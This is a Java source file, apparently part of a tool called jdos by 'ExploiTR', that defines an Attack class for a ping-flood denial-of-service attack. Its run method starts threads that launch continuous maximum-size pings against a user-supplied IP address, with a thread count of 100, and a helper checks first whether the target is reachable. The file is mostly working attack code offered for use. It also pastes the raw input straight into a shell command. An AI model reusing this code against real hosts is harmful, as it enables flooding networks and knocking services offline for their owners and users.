package jdos.exploitr;

import java.io.IOException;
import java.net.InetAddress;

/**
 * Created by ExploiTR on 14-Jun-17.
 * <p>
 * Contains Main Attack Method
 */
public class Attack implements Runnable {

    private final String IPAddress;

    public static int timeOut = 250;
    public static long byteSize = 65527;
    public static int THREAD_COUNT = 100;

    public Attack(String IP) {
        this.IPAddress = IP;
    }

    @Override
    public void run() {
        new Thread(() -> {
            try {
                Controller.processArrayList
                        .add(Runtime.getRuntime().exec("ping " + IPAddress + " -t -l " + byteSize));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }


    public boolean validIP() {
        String[] v4 = IPAddress.split("\\.");
        return v4.length >= 2 && v4.length <= 4;
    }

    public void checkIP(Runner runner) {
        new Thread(() -> {
            if (!validIP()) {
                runner.onDone(false);
                return;
            }
            try {
                if (IPAddress.split("\\.").length > 3) {
                    String[] adder_spt = IPAddress.split("\\.");
                    runner.onDone(InetAddress.getByAddress(new byte[]{
                            (byte) Integer.parseInt(adder_spt[0]),
                            (byte) Integer.parseInt(adder_spt[1]),
                            (byte) Integer.parseInt(adder_spt[2]),
                            (byte) Integer.parseInt(adder_spt[3])
                    }).isReachable(timeOut));
                } else {
                    runner.onDone(InetAddress.getByName(IPAddress).isReachable(timeOut));
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public interface Runner {
        void onDone(boolean what);
    }
}
